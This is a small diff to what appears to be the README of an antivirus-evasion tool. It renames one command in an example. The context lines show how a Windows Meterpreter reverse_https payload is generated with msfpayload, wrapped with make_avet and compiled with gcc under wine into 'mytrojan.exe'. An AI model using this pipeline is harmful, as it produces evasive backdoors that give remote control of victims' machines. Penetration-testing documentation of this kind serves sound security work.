@@ -64,7 +64,7 @@ Example 1, compile shellcode into the .exe file:
 
 $ msfpayload windows/meterpreter/reverse_https lhost=192.168.2.112 lport=443 C > sh.txt
 $ ./format.sh sh.txt > sh_clean.txt
-$ ./make_avet.exe -f sh_clean.txt
+$ ./make_avet -f sh_clean.txt
 $ wine ~/.wine/drive_c/MinGW/bin/gcc.exe -o mytrojan.exe avet.c
 
 
